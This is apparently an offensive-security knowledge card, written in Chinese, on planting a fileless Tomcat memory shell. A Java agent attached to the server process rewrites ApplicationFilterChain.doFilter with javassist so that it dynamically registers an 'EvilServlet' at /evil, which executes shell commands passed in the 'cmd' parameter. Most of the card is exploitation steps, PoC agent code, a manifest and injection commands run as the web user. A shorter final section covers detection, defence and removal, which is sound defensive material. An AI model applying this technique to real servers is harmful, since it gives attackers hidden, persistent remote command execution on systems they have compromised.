---
id: web-java-classloader-agentmain-filterchain-dynamic-servletregistration
title: agentmain 改写 ApplicationFilterChain.doFilter：借 ServletContext 动态注册 API 装入 EvilServlet
type: scenario
domain: web
path: web/java/classloader
technique: agentmain-javassist-filterchain-insert-servletcontext-addservlet-registration
aliases:
- Agent 动态注册 Servlet 内存马
- ServletContext addServlet 内存马
- getServletRegistration 防重复注入
- ApplicationFilterChain insertBefore 注册组件
- Injector VirtualMachine loadAgent
tags:
- java
- tomcat
- memshell
- java-agent
- agentmain
- javassist
- instrumentation
- attach-api
- servlet
- persistence
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T21:48:59+08:00'
  notes: 已对照原文核对：agentmain 中 addTransformer(ServletListenerTransformer,true) 仅处理 org/apache/catalina/core/ApplicationFilterChain、javassist 取 doFilter 后 insertBefore、插入代码为 getServletContext + getServletRegistration 幂等判断 + addServlet(EvilServlet, com.example.EvilServlet).addMapping(/evil)、Injector 用 com.sun.tools.attach.VirtualMachine 的 attach/loadAgent/detach、MANIFEST 的 Agent-Class 与 Can-Redefine-Classes/Can-Retransform-Classes、jps 取 PID 与 sudo -u www java -cp tools.jar 执行方式均与正文一致；原文未给受影响版本，未设 affected_versions；本次核对未读取图片，仅依据正文。未验证点：注入链未在本机执行
---

## 一句话结论

拿到与 Tomcat 同权限的 Shell 后，可写一个 `Agent-Class` 声明 `Can-Retransform-Classes: true` 的 agent jar，在 `agentmain` 里注册 `ClassFileTransformer` 命中 `org/apache/catalina/core/ApplicationFilterChain`，用 javassist 在 `doFilter` 方法开头 `insertBefore` 一段代码：取 `$1.getServletContext()`，若 `getServletRegistration("EvilServlet")` 为空就调用 **Servlet 3.0 动态注册 API** `context.addServlet(...).addMapping("/evil")`；再用 `VirtualMachine.attach(pid).loadAgent(jar)` 注入，此后任意一次请求经过 FilterChain 时就会完成注册，`/evil?cmd=` 即可执行命令。

## 原理

- **Agent 是「能改已加载类」的通道**：`agentmain(String, Instrumentation)` 由 JVM 在 attach 后调用，`Instrumentation` 提供 `addTransformer(transformer, true)` 与 `retransformClasses`；把 `canRetransform` 设为 true 才能对已加载的类重跑转换。
- **为什么选 `ApplicationFilterChain#doFilter`**：所有带 filter 链的请求都会经过它，方法参数 `$1` 就是 `ServletRequest`，可直接拿到 `ServletContext`；插入点稳定、触发面广（任意请求都能引爆注册逻辑），且不需要知道业务路由。
- **为什么用 `ServletContext.addServlet` 而不是反射 `StandardContext`**：`ServletContext#addServlet(String, String)` 与 `ServletRegistration.Dynamic.addMapping` 是 Servlet 3.0 的标准动态注册 API，Tomcat 的 `ApplicationContextFacade` 已代理到 `StandardContext`，无需反射私有字段，代码更短、跨容器版本兼容性更好（Jetty/Undertow 同样支持）。
- **`getServletRegistration` 幂等**：FilterChain 会被每次请求触发，若不判断已注册会重复 `addServlet` 抛 `IllegalStateException`；先查 `getServletRegistration("EvilServlet") == null` 保证只注册一次。
- **注册的是类名而非实例**：`addServlet(name, className)` 让容器在首次访问 `/evil` 时用 Web 应用类加载器加载该类并实例化；因此 `EvilServlet` 必须能被该 classloader 找到——通常做法是把恶意类也打进 agent jar 并让 transformer 把它 `defineClass` 进目标 classloader，或在 agent 中直接把字节码 define 到应用 classloader 后再注册实例。
- **Attach 的前置**：Injector 用 `com.sun.tools.attach.VirtualMachine.attach(pid)` + `loadAgent(jarPath)`；需要与被 attach 进程同 UID（或 root）、JDK 带 `tools.jar`（JDK 8）或运行在支持 attach 的 JDK 上，且目标未启用 `-XX:+DisableAttachMechanism`。
- **与「直接改 doFilter 执行命令」的区别**：那种做法每次请求都在 FilterChain 里执行命令、特征集中在 `doFilter`；本做法只在 FilterChain 里做一次「注册」，命令执行落在独立的 Servlet 类里，`doFilter` 的改动看起来更像框架初始化逻辑，检测面不同。

## 触发条件

- 已获得与 Tomcat 进程同 UID（或 root）的命令执行能力，能写 jar 并执行 `java`。
- 目标 JDK 支持 Attach API，未禁用 attach；`tools.jar` 可读（JDK 8）或使用 JDK 9+ 的 `jdk.attach` 模块。
- Tomcat 版本支持 Servlet 3.0 动态注册（Tomcat 7+ 均可），且 `ApplicationContextFacade` 已实现 `addServlet`。
- 恶意 Servlet 类能被目标 Web 应用类加载器加载（打进 agent jar 并由 transformer define，或写入可被加载的目录）。

## 利用步骤

1. 编写 `EvilServlet extends HttpServlet`：`doGet` 取 `cmd` 参数，`Runtime.getRuntime().exec` 后把输出写回 response；`doPost` 转 `doGet`。
2. 编写 `Agent`：`agentmain` 中 `inst.addTransformer(new ServletListenerTransformer(), true)`；transformer 只处理 `"org/apache/catalina/core/ApplicationFilterChain".equals(className)`，用 javassist 取 `doFilter` 方法 `insertBefore` 注册代码，返回 `cc.toBytecode()`。
3. 注册代码的语义：`ServletContext ctx = $1.getServletContext(); if (ctx.getServletRegistration("EvilServlet") == null) { ctx.addServlet("EvilServlet", "com.example.EvilServlet").addMapping("/evil"); }`。
4. 打包 manifest：`Manifest-Version: 1.0`、`Agent-Class: com.example.Agent`、`Can-Redefine-Classes: true`、`Can-Retransform-Classes: true`；jar 内需含 javassist。
5. 编写 Injector：`VirtualMachine.attach(pid)` → `loadAgent(agentJar)` → `detach()`；用 `jps`/`ps aux | grep java` 取 PID。
6. 以与 Tomcat 相同用户执行注入：`sudo -u www <jdk>/bin/java -cp <jdk>/lib/tools.jar:. Injector <PID> /path/to/agent.jar`（`Injector.class` 需与 `tools.jar` 同目录或显式加 classpath）。
7. 触发注册：随便访问一个会经过 FilterChain 的路径（如 `/`），使 `doFilter` 中的插入代码执行一次。
8. 访问 `/evil?cmd=id` 验证命令执行；排查时可从 `StandardContext` 的 children/Wrapper 中找到 `EvilServlet` 这一异常注册项。

## PoC

Agent 关键片段（javassist 插入动态注册代码）：

```java
public static void agentmain(String agentArgs, Instrumentation inst) {
    inst.addTransformer(new ClassFileTransformer() {
        public byte[] transform(ClassLoader loader, String className, Class<?> redef,
                                ProtectionDomain pd, byte[] buf) throws IllegalClassFormatException {
            if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) return null;
            try {
                ClassPool cp = ClassPool.getDefault();
                cp.insertClassPath(new ClassClassPath(this.getClass()));
                CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore(
                    "javax.servlet.ServletContext ctx = $1.getServletContext();" +
                    "if (ctx.getServletRegistration(\"EvilServlet\") == null) {" +
                    "  ctx.addServlet(\"EvilServlet\", \"com.example.EvilServlet\").addMapping(\"/evil\");" +
                    "}");
                byte[] out = cc.toBytecode();
                cc.detach();
                return out;
            } catch (Exception e) { e.printStackTrace(); }
            return null;
        }
    }, true);
}
```

```text
MANIFEST.MF:
  Manifest-Version: 1.0
  Agent-Class: com.example.Agent
  Can-Redefine-Classes: true
  Can-Retransform-Classes: true

注入：
  javac -cp <jdk>/lib/tools.jar:. Injector.java
  sudo -u www <jdk>/bin/java -cp <jdk>/lib/tools.jar:. Injector <TomcatPID> /path/to/agent.jar

验证：
  访问任意经 FilterChain 的路径触发注册 -> GET /evil?cmd=id 回显命令输出
```

## 变体与关联

- 变体（注册实例而非类名）：在 transformer 里把 `EvilServlet` 字节码 `defineClass` 到应用 classloader，再 `addServlet(name, servletInstance)`，避免类名找不到的问题。
- 变体（改注册点）：把插入点换成 `HttpServlet#service`、`StandardContextValve#invoke`、`Request#getSession` 等，触发面不同；FilterChain 的优点是覆盖所有带 filter 的请求。
- 变体（不注册 Servlet）：直接在 `doFilter` 里执行命令并写响应（见关联卡），代码更短但特征更集中。
- 关联：[[web-java-classloader-deser-attach-agent-filterchain-memshell]]（同样改 `ApplicationFilterChain.doFilter`，但插入的是命令执行代码，且经反序列化链驱动 attach；本卡插入的是 Servlet 3.0 动态注册调用，最终执行面在不存在的 `/evil` 路由上）、[[web-java-classloader-attach-api-jvmti-agent-memory-shell]]（改写 `HttpServlet.service` 的 X-Token 马）、[[web-java-classloader-agent-httpservlet-jar-loader]]（`redefineClasses` + 远程 Jar Loader 作为后续注入载体）、[[web-java-component-tomcat-standardcontext-servlet-memshell]]（纯 JSP 反射 `createWrapper`+`addServletMappingDecoded` 的非 Agent 版本）。
- 边界：目标禁用 attach 或权限不足则无法注入；`getServletContext()` 在某些 wrapper 场景可能返回 null（需换 `$2`/thread context classloader 取）；`addServlet` 在 Tomcat 中若同名已存在会抛 `IllegalStateException`，因此幂等判断不可省。

## 检测与防御

- 检测（运行时）：`ApplicationFilterChain.doFilter` 被 `retransform` 修改（Arthas `sc -d` 看 `code-source`、`jad` 反编译比对原始字节码）；`ServletContext.addServlet`/`ServletRegistration.addMapping` 在运行期被调用（RASP hook）；出现无 `web.xml`/注解声明、无磁盘 class 文件的 Wrapper。
- 检测（进程/host）：`.attach_pid`/`.java_pid` 残留、非运维时间的 `jps`/`jcmd`/`java -cp tools.jar` 调用、`sudo -u <webuser>` 执行 java 的日志。
- 防御：限制 attach（`-XX:+DisableAttachMechanism`、隔离 JVM 与运维用户）；RASP 或 Agent 监控 `Instrumentation#addTransformer`/`retransformClasses` 与容器动态注册 API；Web 目录只读、禁止上传可执行文件；修复入口漏洞（上传/反序列化/弱口令），内存马只是结果。
- 处置：移除注册的 Servlet（从 `StandardContext` 删除 Wrapper/映射）、卸载恶意 transformer（`removeTransformer` + `retransformClasses` 还原），再重启一次彻底清理；只删 Servlet 而不清 transformer，下一次请求会立刻重新注册。
